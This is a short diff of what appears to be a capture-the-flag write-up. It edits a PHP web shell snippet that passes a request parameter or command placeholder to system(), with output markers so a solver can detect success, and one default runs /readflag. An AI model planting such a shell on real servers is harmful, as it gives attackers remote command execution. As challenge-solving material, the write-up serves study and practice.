@@ -132,7 +132,7 @@ system($_GET["x"] ?? "/readflag");
 I wrapped the output with markers so the solver could tell when it actually worked:
 
 ```php
-<?php echo "__OUT_<sid>__"; system($_GET["x"] ?? "/readflag"); echo "__END_<sid>__"; ?>
+<?php echo '---START---'; system('{COMMAND}'); echo '---END---'; ?>
 ```
 
 ## solver
